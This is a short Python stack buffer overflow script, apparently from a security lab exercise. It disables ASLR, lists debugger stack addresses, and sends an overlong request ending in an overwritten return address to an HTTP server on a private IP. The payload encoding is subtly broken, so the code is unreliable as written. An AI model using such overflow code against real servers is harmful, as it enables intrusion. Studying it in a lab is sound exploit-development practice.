# echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
# 
# pinfo               
# info       
# 18 exp1_http_session   0x7fffffffe4c8 --> 0x401c70    
# 31 exp1_parse_header   0x7fffffffda08 --> 0x4014d6
# 63 exp1_parse_status   0x7fffffffd348 --> 0x4015a9
# 35 exp1_http_reply     0x7fffffffd788 --> 0x4014f6
# exp1_http_session return 37
# buf address --> 0x7fffffffdcb0

import socket

# msg = "HTTP/1.0 /index.html \r\n"

host = "192.168.33.34"
port = 12345
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((host, port))

msg = "\x41" * 2048
# msg += "\x41" * 500
# msg += "\r\n"
sock.send(msg.encode())

msg = "\x42" * 24
msg += "\xd8\xe4\xff\xff"
# msg += "\x00\x00\x7f\xff"
# msg += "\x44" * 2017
sock.send(msg.encode())
sock.close()


# msg = "\x43" * 1024
# sock.send(msg.encode())

# recv = sock.recv(4096)
# print(recv.decode())